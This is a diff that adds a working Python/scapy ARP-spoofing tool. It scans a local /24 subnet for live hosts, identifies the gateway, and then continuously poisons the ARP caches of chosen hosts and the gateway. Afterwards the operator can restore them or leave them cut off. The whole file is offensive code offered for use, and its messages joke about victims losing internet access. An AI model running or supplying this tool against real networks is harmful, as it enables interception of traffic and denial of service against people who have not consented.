@@ -1,0 +1,235 @@
+#!/usr/bin/python
+from copy import deepcopy
+from datetime import datetime
+from random import randint
+from time import sleep
+import scapy.all as sc
+import argparse
+from scapy.layers.l2 import Ether, ARP
+import threading
+import os
+
+hosts = []
+gateway = (None, None)
+arg_ip = ".".join(os.sys.argv[1].split(".")[0:3])
+
+
+def check_host(IP):
+    global hosts
+    try:
+        #print("[*] Sending packets to ", IP)
+        arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
+        res = sc.srp(arppacket*20, timeout=60, verbose=False)
+        if res[0]:
+            print("[*] Recieved a packet from", IP)
+            mac = res[0][0][1].hwsrc
+            hosts.append((mac, IP))
+        #else:
+            #print("[*] Recieved nothing from ", IP)
+    except:
+        print("[!] Something went wrong while checking", IP)
+    
+def spoof_host(host, event):
+    global gateway
+    try:
+        packet1 = Ether(dst=host[0])/ARP(op=2, pdst=host[1], psrc=gateway[1], hwdst=host[0])
+        packet2 = Ether(dst=gateway[0])/ARP(op=2, pdst=gateway[1], psrc=host[1], hwdst=gateway[0])
+        print("[*] Started spoofing", host[1], "at", host[0])
+        while True:
+            sc.sendp(packet1*10, verbose=False)
+            sc.sendp(packet2*10, verbose=False)
+            if event.is_set():
+                print("[*] Stopped spoofing for", host[1])
+                break
+        
+    except:
+        print("[!] Something went wrong while spoofing", host[1], "at", host[0])
+
+def report(attacked, restored, start):
+    global gateway
+    print("\n")
+    print("                    ATTACK FINISHED                    ")
+    print("=======================================================")
+    print("Gateway:    {0} at {1}".format(gateway[1], gateway[0]))
+    print("Attacked:   {} hosts".format(len(attacked)))
+    for host in attacked:
+        print(host[1], "at", host[0])
+    print("Restored:   {} hosts".format(len(restored)))
+    for host in restored:
+        print(host[1], "at", host[0])
+    print()
+    print("Started:    {}".format(start))
+    print("Finished:   {}".format(str(datetime.now())))
+    print("=======================================================")
+
+def animation(event):
+    global hosts
+    frame = 1
+    maxframe = 40
+    box = """
++========================================+
+|                                        |
+|                                        |         ATTACK
+|                                        |
+|                                        |           IN
+|                                        |
+|                                        |        PROGRESS
+|                                        |
+|                                        |
+|                                        |
+|                                        |
+|                                        |
+|                                        |
++========================================+
+""".splitlines()[1:]
+    pos = (2,2)
+
+    while True:
+        if event.is_set():
+            break
+        for n in range(len(box)):
+            if n != 0 and n != 13:
+                if n != pos[0]:
+                    t = list(box[n][:])
+                    t[frame] = '#'
+                    print(''.join(t))
+                else:
+                    t = list(box[n][:])
+                    t[frame] = '#'
+                    t[pos[1]] = '@'
+                    print(''.join(t))
+                    
+            else:
+                print(box[n])
+        print("\n{} hosts being attacked:".format(len(hosts)))
+        for host in hosts:
+            print(host[1], "at", host[0])
+        sleep(0.03)
+        frame +=1 
+        if frame >= maxframe:
+            frame = 1
+            pos = (randint(1, 12), randint(1, 39))
+
+def main():
+    global hosts, gateway
+    threads = []
+    print("[*] Starting scanning on {} threads".format(255))
+    for n in range(1, 255):
+        IP = "{}.{}".format(arg_ip, n)
+        t = threading.Thread(target=check_host, args=[IP])
+        t.start()
+        threads.append(t)
+    print("[*] Threads started. Scanning for hosts...")
+    sleep(1)
+    # e = threading.Event()
+    # q = threading.Thread(target=animation, args=[e])
+    # q.start()
+    for thread in threads:
+        thread.join()
+    # e.set()
+    for host in hosts:
+        if host[1] == "{}.1".format(arg_ip):
+            gateway = host
+            hosts.remove(host)
+            print("[*] Gateway found to be {0} at {1}".format(host[1], host[0]))
+            break
+    else:
+        print("[!!] No active gateway adress found, QUITTING!")
+        exit(1)
+    print("===================================================")
+    print("Found {} hosts".format(len(hosts)))
+    for host in hosts:
+        print(host[1], "at", host[0])
+    a = input("Start spoofing ([y] - yes [n] - no [i] - decide individually) ? ")
+    match a:
+        case 'y':
+            print("Spoofing all hosts.")
+        case 'n':
+            print("Spoofing stopped, quitting now.")
+            exit(0)
+        case 'i':
+            for host in hosts[:]:
+                b = input("Attack {0} at {1} ? ".format(host[1], host[0]))
+                match b:
+                    case 'y':
+                        print("Added {} to attack list.".format(host[1]))
+                    case 'n':
+                        print("Will not attack {} . Another safe day for them today.".format(host[1]))
+                        hosts.remove(host)
+                    case _:
+                        print("I don't know what that means, so I assume we attack {} today.".format(host[1]))
+        case _:
+            print("I cannot understand this, quitting now.")
+            exit(1)
+    print("===================================================")
+    print("[*] Starting spoofing for {} hosts".format(len(hosts)))
+    starttime = str(datetime.now())
+    threads = []
+    event = threading.Event()
+    for host in hosts:
+        t = threading.Thread(target=spoof_host, args=[host, event])
+        t.start()
+        threads.append(t)
+    print("[*] Spoofing hosts started.")
+    print("\t Relax and watch the world burn.")
+    print("\t Press ^C to stop spoofing.")
+    try:
+        animation(threading.Event())
+    except KeyboardInterrupt:
+        print("[*] Stopping spoofing for {} hosts".format(len(hosts)))
+        event.set()
+        sleep(2)
+        for thread in threads:
+            thread.join()
+        attacked = deepcopy(hosts)
+        print("===================================================")
+        print("Spoofed {} hosts more or less succesfully.".format(len(hosts)))
+        for host in hosts:
+            print(host[1], "at", host[0])
+        a = input("Restore them ([y] - yes [n] - no [i] - decide individually) ? ")
+        match a:
+            case 'y':
+                print("Restoring all hosts.")
+            case 'n':
+                print("Restoring none, leaving as it is.")
+                print("===================================================")
+                report(hosts, [], starttime)
+                exit(0)
+            case 'i':
+                for host in hosts[:]:
+                    b = input("Restore {0} at {1} ? ".format(host[1], host[0]))
+                    match b:
+                        case 'y':
+                            print("Added {} to restoration list.".format(host[1]))
+                        case 'n':
+                            print("Will not restore {} . Looks like no internet for them today.".format(host[1]))
+                            hosts.remove(host)
+                        case _:
+                            print("I don't know what that means, so I assume we restore {} .".format(host[1]))
+            case _:
+                print("I cannot understand this, quitting now.")
+                exit(1)
+        print("===================================================")
+        for host in hosts:
+            print("[*] Restoring", host[1])
+            try:
+                packet = Ether(dst=host[0], src=gateway[0])/ARP(op=2,
+                    hwsrc=gateway[0],
+                    psrc=gateway[1],
+                    hwdst=host[0],
+                    pdst=host[1])
+                sc.sendp(packet*10, verbose=False)
+                packet = Ether(dst=gateway[0], src=host[0])/ARP(op=2,
+                    hwsrc=host[0],
+                    psrc=host[1],
+                    hwdst=gateway[0],
+                    pdst=gateway[1])
+                sc.sendp(packet*10, verbose=False)
+                print("[*] Restored", host[1])
+            except:
+                print("[!] Trouble restoring {0} , looks like no internet for them today!".format(host[1]))
+        report(attacked, hosts, starttime)
+
+
+if __name__ == "__main__":
+    main()
